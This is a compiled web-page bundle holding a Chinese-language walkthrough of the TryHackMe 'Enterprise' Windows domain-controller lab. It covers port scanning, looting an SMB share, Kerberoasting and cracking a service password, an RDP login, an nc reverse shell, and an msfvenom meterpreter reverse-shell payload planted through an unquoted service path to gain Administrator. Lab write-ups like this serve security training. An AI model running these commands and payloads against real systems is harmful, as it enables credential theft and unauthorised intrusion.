"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[6440],{60790:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>i,metadata:()=>a,toc:()=>p});var s=t(74848),r=t(28453);const i={sidebar_position:171,tags:["Easy","Windows","Kerberos","PATH-Windows"],title:"Enterprise",description:"Enterprise",sidebar_label:"Enterprise",slug:"/tryhackme/171"},o="Enterprise",a={id:"box/TryHackMe/171",title:"Enterprise",description:"Enterprise",source:"@site/docs/box/TryHackMe/171.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/171",permalink:"/docs/tryhackme/171",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Windows",permalink:"/docs/tags/windows"},{label:"Kerberos",permalink:"/docs/tags/kerberos"},{label:"PATH-Windows",permalink:"/docs/tags/path-windows"}],version:"current",sidebarPosition:171,frontMatter:{sidebar_position:171,tags:["Easy","Windows","Kerberos","PATH-Windows"],title:"Enterprise",description:"Enterprise",sidebar_label:"Enterprise",slug:"/tryhackme/171"},sidebar:"boxSidebar",previous:{title:"Jurassic Park",permalink:"/docs/tryhackme/170"},next:{title:"Enterprise",permalink:"/docs/tryhackme/172"}},c={},p=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"SMB",id:"smb",level:2},{value:"7990",id:"7990",level:2},{value:"Kerberos",id:"kerberos",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"bitbucket",id:"bitbucket",level:3},{value:"bitbucket \u2014&gt; Administrator",id:"bitbucket--administrator",level:3}];function l(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"enterprise",children:"Enterprise"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-110-123:~/enterprise# nmap -sTCV -p- --min-rate 1000 10.10.213.49\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-29 08:52 GMT\nNmap scan report for ip-10-10-213-49.eu-west-1.compute.internal (10.10.213.49)\nHost is up (0.00024s latency).\nNot shown: 65507 closed ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Site doesn't have a title (text/html).\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-29 08:53:14Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM\n| Not valid before: 2023-10-28T08:48:46\n|_Not valid after:  2024-04-28T08:48:46\n|_ssl-date: 2023-10-29T08:54:09+00:00; 0s from scanner time.\n5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Service Unavailable\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n7990/tcp  open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Log in to continue - Log in with Atlassian account\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\n49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49673/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\n49714/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 02:E1:2C:63:C0:1B (Unknown)\nService Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: LAB-DC, NetBIOS user: <unknown>, NetBIOS MAC: 02:e1:2c:63:c0:1b (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2023-10-29 08:54:09\n|_  start_date: 1600-12-31 23:58:45\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 105.01 seconds\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"info",children:(0,s.jsxs)(n.p,{children:["\ud83d\udd25 \u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u57df\u540d\u4e3a : ",(0,s.jsx)(n.code,{children:"LAB.ENTERPRISE.THM"})]})}),"\n",(0,s.jsx)(n.h2,{id:"smb",children:"SMB"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202827.png",alt:"image-20240709202826293"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"Docs"})," : \u7ed9\u4e86\u4e24\u4e2a\u6587\u4ef6\u4f46\u662f\u90fd\u662f\u52a0\u5bc6\u5185\u5bb9\u65e0\u6cd5\u89e3\u5bc6"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"Users"})," : \u5bf9\u5e94\u7684\u5c31\u662f ",(0,s.jsx)(n.code,{children:"C:\\Users"})," \u76ee\u5f55, \u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u5feb\u901f\u83b7\u53d6\u5230\u7528\u6237\u7684\u540d\u79f0 (\u4e4b\u540e\u6211\u5c1d\u8bd5 kerberos \u5229\u7528\u53ef\u60dc\u5931\u6548)"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u5728\u6b64\u83b7\u53d6\u5230\u4e00\u4e2a\u8d26\u53f7, \u4f46\u662f\u53ef\u60dc\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"smb: \\LAB-ADMIN\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\> ls\n  .                                   D        0  Fri Mar 12 04:00:39 2021\n  ..                                  D        0  Fri Mar 12 04:00:39 2021\n  Consolehost_hisory.txt              A      424  Fri Mar 12 03:51:46 2021\n\n\t\t15587583 blocks of size 4096. 9900318 blocks available\nsmb: \\LAB-ADMIN\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\> get Consolehost_hisory.txt \ngetting file \\LAB-ADMIN\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (103.5 KiloBytes/sec) (average 103.5 KiloBytes/sec)\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202833.png",alt:"image-20240709202831706"})}),"\n",(0,s.jsx)(n.h2,{id:"7990",children:"7990"}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u5728\u67e5\u770b 80 \u7aef\u53e3\u65e0\u679c\u540e, \u67e5\u770b\u6b64\u9875\u9762, \u53d1\u73b0\u5176\u663e\u793a\u6b63\u5728\u8fc1\u79fb\u5230 github ",(0,s.jsx)(n.a,{href:"https://github.com/Enterprise-THM",children:"Enterprise.THM"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202843.png",alt:"image-20240709202842087"})}),"\n",(0,s.jsx)(n.p,{children:"\u4ece\u5176\u5b58\u50a8\u5e93\u4e2d\u6211\u5f97\u5230\u4e86\u4e00\u4e2a\u8d26\u53f7"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202851.png",alt:"image-20240709202849590"})}),"\n",(0,s.jsx)(n.h2,{id:"kerberos",children:"Kerberos"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202947.png",alt:"image-20240709202946086"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-139-192:~#  john hash.txt --wordlist=`locate rockyou.txt`\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nlittleredbucket  (?)\n1g 0:00:00:02 DONE (2023-10-29 10:36) 0.3690g/s 579447p/s 579447c/s 579447C/s livelife92..littled8\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"bitbucket",children:"bitbucket"}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u8d26\u53f7\u8fdb\u884c\u767b\u9646 bitbucket \u6211\u53d1\u73b0\u65e0\u6cd5\u767b\u9646 winrm \u670d\u52a1\u4f46\u662f\u53ef\u4ee5\u767b\u9646 RDP \u670d\u52a1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-139-192:~# xfreerdp /v:10.10.200.231 /u:bitbucket /p:littleredbucket\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u767b\u9646\u4e4b\u540e\u6211\u4e0a\u4f20\u4e86 nc \u83b7\u53d6\u4e86\u4e00\u4e2a\u53cd\u5411 Shell"}),"\n",(0,s.jsx)(n.h3,{id:"bitbucket--administrator",children:"bitbucket \u2014> Administrator"}),"\n",(0,s.jsx)(n.p,{children:"\u4e0a\u6b21 winpeas \u8fdb\u884c\u6267\u884c\u6211\u53d1\u73b0\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a PATH \u8def\u5f84\u6ce8\u5165"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-203003.png",alt:"image-20240709203002111"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5236\u4f5c\u6728\u9a6c\u8fdb\u884c\u4e0a\u4f20\u5230 \u76ee\u6807\u8fdb\u884c\u6267\u884c \u6211\u4e0a\u4f20\u5230\u4e86 ",(0,s.jsx)(n.code,{children:"C:\\Program Files (x86)\\Zero Tier\\Zero.exe"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-139-192:~/Test# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.139.192 LPORT=9999 -f exe --arch x64 --platform windows > Zero.exe\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e0a\u4f20\u540e\u91cd\u542f\u670d\u52a1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"PS C:\\Program Files (x86)\\Zero Tier> Stop-Service zerotieroneservice\nPS C:\\Program Files (x86)\\Zero Tier> Start-Service zerotieroneservice\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Shell (\u9057\u61be\u7684\u662f\u8fd9\u4e2a Shell \u8d85\u7ea7\u4e0d\u7a33\u5b9a\u53ea\u6709\u4e00\u5206\u949f\u5de6\u53f3)"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-203009.png",alt:"image-20240709203007743"})})]})}function d(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>a});var s=t(96540);const r={},i=s.createContext(r);function o(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);